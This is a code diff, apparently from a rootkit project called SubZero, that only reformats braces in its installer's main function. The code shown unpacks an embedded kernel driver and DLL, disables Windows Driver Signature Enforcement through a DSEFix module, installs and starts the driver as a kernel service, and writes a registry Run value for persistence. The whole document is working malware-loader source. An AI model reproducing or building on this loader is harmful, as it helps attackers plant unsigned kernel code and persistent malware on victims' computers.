@@ -9,7 +9,8 @@
 #include "../SubZeroUtils/AutoHandle.h"
 #include "../SubZeroCleanup/SubZeroCleanup.h"
 
-extern "C" {
+extern "C"
+{
 #include "../DSEFix/DSEFix.h"
 }
 
@@ -66,12 +67,14 @@ int wmain(int argc, wchar_t* argv[])
 	}
 
 	// Save resources to file system
-	try {
+	try 
+	{
 		const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
 		driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
 		DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
 	}
-	catch (const Win32ErrorCodeException& exception) {				
+	catch (const Win32ErrorCodeException& exception) 
+	{				
 		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
 		{
 			// Error extracting/saving resource
@@ -81,12 +84,14 @@ int wmain(int argc, wchar_t* argv[])
 		}
 	}
 
-	 try {
+	try 
+	{
 		const PeResource libraryResource(IDR_NKUI1, DLL_RESOURCE_NAME);
 		libraryResource.saveResourceToFileSystem(DLL_FULL_PATH);
 		DEBUG_PRINT("[+] DLL extracted and saved to file system successfully");
 	}
-	catch (const Win32ErrorCodeException& exception) {
+	catch (const Win32ErrorCodeException& exception) 
+	{
 		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
 		{
 			// Error extracting/saving resource
@@ -101,26 +106,30 @@ int wmain(int argc, wchar_t* argv[])
 	DEBUG_PRINT("[+] DSE protection disabled");
 
 	// Load driver
-	try {
+	try 
+	{
 		ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
 		serviceManager.installAndStart();
 		
 		DEBUG_PRINT("[+] Driver installed and started successfully");
 	}
-	catch (const Win32ErrorCodeException& exception) {
+	catch (const Win32ErrorCodeException& exception) 
+	{
 		DEBUG_PRINT(exception.what());
 		SubZeroCleanup::Cleanup();
 		return 1;
 	}
 
-	try {
+	try 
+	{
 		AutoRegistryKeyHandle AutoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
 		RegistryManager::SetRegistryValue(AutoRegKey.get(), REG_VALUE_NAME, REG_SZ, 
 			(PVOID)LAUNCHER_FULL_PATH.c_str(), LAUNCHER_FULL_PATH.length() * sizeof(WCHAR));
 		
 		DEBUG_PRINT("[+] Successfully Added as RUN value");
 	}
-	catch (const Win32ErrorCodeException& exception) {
+	catch (const Win32ErrorCodeException& exception) 
+	{
 		SubZeroCleanup::Cleanup();
 		DEBUG_PRINT(exception.what());
 	}
